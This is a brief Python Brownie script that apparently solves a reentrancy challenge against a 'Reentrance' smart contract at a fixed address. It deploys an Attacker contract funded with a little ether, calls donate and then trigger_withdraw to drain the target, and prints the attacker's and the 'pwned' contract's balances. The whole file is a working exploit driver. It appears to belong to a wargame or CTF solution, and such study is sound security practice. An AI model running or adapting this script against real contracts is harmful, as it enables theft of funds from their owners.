from brownie import Reentrance, Attacker, Contract
from scripts.helpful_scripts import *
from web3 import Web3

account = getAccount()
pwned = Contract.from_abi(
    "Reentrance", "0x1a39bD88531CDCfC0AF6A778147ab9458Ae820D6", Reentrance.abi
)


def main():
    # attacker = Attacker[-1]
    attacker = Attacker.deploy({"from": account, "value": Web3.toWei(0.0001, "ether")})
    tx = attacker.donate({"from": account})
    tx.wait(1)
    tx2 = attacker.trigger_withdraw({"from": account})
    tx2.wait(1)
    print(f"Attacker Balance: {Web3.fromWei(attacker.balance(), 'ether')}")
    print(f"Pwned Balance: {Web3.fromWei(pwned.balance(), 'ether')}")
